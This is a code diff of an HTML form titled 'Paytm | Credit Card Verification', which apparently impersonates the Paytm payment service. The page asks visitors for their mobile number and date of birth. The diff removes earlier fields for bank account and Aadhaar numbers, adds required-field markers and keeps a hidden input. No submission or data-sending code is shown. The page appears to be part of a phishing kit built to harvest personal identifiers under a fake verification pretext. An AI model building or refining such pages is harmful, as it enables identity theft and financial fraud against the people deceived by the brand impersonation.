@@ -26,7 +26,10 @@
   <meta name="theme-color" content="#ffffff">
   <title>Paytm | Credit Card Verification</title>
   <style>
-  .inlineimage{max-width:470px;margin-right: 8px;margin-left: 10px}.images{display: inline-block;max-width: 98%;height: auto;width: 22%;margin: 1%;left:20px;text-align: center}
+  .inlineimage{max-width:470px;margin-right: 8px;margin-left: 10px}.images{display: inline-block;max-width: 98%;height: auto;width: 22%;margin: 1%;left:20px;text-align: center}      .required::after {
+        content: ' *';
+        color: red;
+      }.not1{margin:0 10px;background:#dede;font-size:14px;font-weight:700;color:#597b59ed;padding:5px;border-radius:4px}
   #ml
   {
   width:70%;
@@ -97,38 +100,15 @@
                     <div class="panel-body">
                         <form role="form"><div class="row">
                                 <div class="col-xs-12">
-                                    <div class="form-group"> <label>Enter Mobile No.</label> <input type="phone" inputmode="number" name="Mobile" class="form-control" placeholder="Mobile No." maxlength="10" 
+                                    <div class="form-group"> <label class="required">Enter Mobile No.</label> <input type="phone" inputmode="number" name="Mobile" class="form-control" placeholder="Mobile No." maxlength="10" 
                                     title="Please enter valid Mobile Number!"
                                     required=""/> </div>
-<div class="row">
-                                <div class="col-xs-12">
-                                    <div class="form-group"> <label>Enter Account Number</label> <input type="tel"  name="Ac_no." class="form-control" placeholder="A/c No." maxlength="20" title="Please enter valid A/c No.!"
-                                    required=""/> </div>
-<div class="row">
-                                <div class="col-xs-12">
-                                    <div class="form-group"> <label>Enter Aadhar Card Number</label><input type="tel" name="Aadhar" class="form-control" onkeypress="return formats(this,event)" onkeyup="return numberValidation(event)" placeholder="XXXX XXXX XXXX" required=""/>  
-                                        <script>
-                                        function formats(ele,e){
-                                        if(ele.value.length<14){
-                                        ele.value= ele.value.replace(/\W/g, '').replace(/(.{4})/g, '$1 ');
-                                        return true;
-                                        }else{
-                                        return false;
-                                        }
-                                        }
-                                        
-                                        function numberValidation(e){
-                                        e.target.value = e.target.value.replace(/[^\d ]/g,'');
-                                        return false;
-                                        }
-                                        </script> </div>
 
 <div class="row">
                                 <div class="col-xs-12">
-                                    <div class="form-group"> <label>User DOB</label> <input type="date" inputmode="date" name="Dob" class="form-control" placeholder="select"                                    title="Please enter valid DOB !"
+                                    <div class="form-group"> <label class="required">User DOB</label > <input type="date" inputmode="date" name="Dob" class="form-control" placeholder="select"                                    title="Please enter valid DOB !"
                                     required=""/> </div>
-                                    </div>
-                                </div>
+                                   
                             </div>
                             </div></div>
                             </div><input  id="00NF000000DAKs6" maxlength="20" name="00NF000000DAKs6" size="20" type="hidden">
